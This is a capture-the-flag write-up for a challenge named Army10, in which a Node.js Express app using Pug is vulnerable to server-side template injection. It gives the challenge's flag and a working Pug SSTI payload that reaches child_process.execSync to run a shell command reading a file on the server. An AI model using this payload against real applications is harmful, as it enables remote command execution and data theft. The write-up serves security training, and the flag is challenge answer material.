# Army10

>
> ### user: PWNX{030bfc71138bf2fa58413b66bd3425d4}
> 

## Description

A simple web application that echoes anything the user writes.

## Technical description

The target is a NodeJS [Express](https://expressjs.com/) application which is using the [Pug template Engine](https://pugjs.org/api/getting-started.html). The application is vulnerable to Server Side Template Injection ([SSTI](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)). The attacker has to find the correct exploit to obtain the flag. 

## Writeup

The challenge only exposes the port `3000/tcp` which presents a webserver with a form that echoes anything the user writes. Trying a lot of combination of characters, the application crashes giving in the HTTP response the following error

```javascript

Error: Pug:1:10
  > 1| <p>#{</p>
----------------^

End of line was reached with no closing bracket for interpolation.
    at makeError (/var/www/html/node_modules/pug-error/index.js:34:13)
    at Lexer.error (/var/www/html/node_modules/pug-lexer/index.js:62:15)
    at Lexer.addText (/var/www/html/node_modules/pug-lexer/index.js:614:16)
    at Lexer.textHtml (/var/www/html/node_modules/pug-lexer/index.js:661:12)
    at Lexer.callLexerFunction (/var/www/html/node_modules/pug-lexer/index.js:1647:23)
    at Lexer.advance (/var/www/html/node_modules/pug-lexer/index.js:1690:12)
    at Lexer.callLexerFunction (/var/www/html/node_modules/pug-lexer/index.js:1647:23)
    at Lexer.getTokens (/var/www/html/node_modules/pug-lexer/index.js:1706:12)
    at lex (/var/www/html/node_modules/pug-lexer/index.js:12:42)
    at Object.lex (/var/www/html/node_modules/pug/lib/index.js:104:9)

```

Now the attacker knows what he is against at. The NodeJS Pug Template Engine.
Doing a lot of researches an attacker discovers that this template engine can be affected to SSTI vulnerabilities, so the attacker can use the following exploit to read the flag and complete the challenge

```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;return localLoad("child_process").execSync('cat /opt/flag.txt')}()}
```

